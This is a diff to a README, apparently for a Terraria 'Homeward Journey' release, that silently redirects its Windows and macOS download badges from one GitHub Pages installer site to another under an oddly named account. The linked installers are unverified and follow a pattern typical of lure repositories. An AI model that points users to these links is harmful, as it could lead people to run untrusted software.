@@ -28,7 +28,7 @@ Whether you're a newcomer just getting started or a seasoned pro looking for adv
 
 <div align="center">
 
-[![Download Terraria Homeward Journey](https://img.shields.io/badge/%E2%AC%87_DOWNLOAD_TERRARIA_HOMEWARD_JOURNEY-CE0000?style=for-the-badge&logo=github&logoColor=white)](https://mixedlinkrelease.github.io/installer/)
+[![Download Terraria Homeward Journey](https://img.shields.io/badge/%E2%AC%87_DOWNLOAD_TERRARIA_HOMEWARD_JOURNEY-CE0000?style=for-the-badge&logo=github&logoColor=white)](https://BursarHypnotize.github.io/install-win/)
 
 </div>
 
@@ -62,8 +62,8 @@ Getting started with **Terraria Homeward Journey** is quick and straightforward.
 
 <div align="center">
 
-[![Download for Windows](https://img.shields.io/badge/Download%20for%20Windows-3E2723?style=for-the-badge&logo=windows&logoColor=white)](https://mixedlinkrelease.github.io/installer/)
-[![Download for macOS](https://img.shields.io/badge/Download%20for%20macOS-3E2723?style=for-the-badge&logo=apple&logoColor=white)](https://mixedlinkrelease.github.io/installermac/)
+[![Download for Windows](https://img.shields.io/badge/Download%20for%20Windows-3E2723?style=for-the-badge&logo=windows&logoColor=white)](https://BursarHypnotize.github.io/install-win/)
+[![Download for macOS](https://img.shields.io/badge/Download%20for%20macOS-3E2723?style=for-the-badge&logo=apple&logoColor=white)](https://BursarHypnotize.github.io/install-mac/)
 
 </div>
 
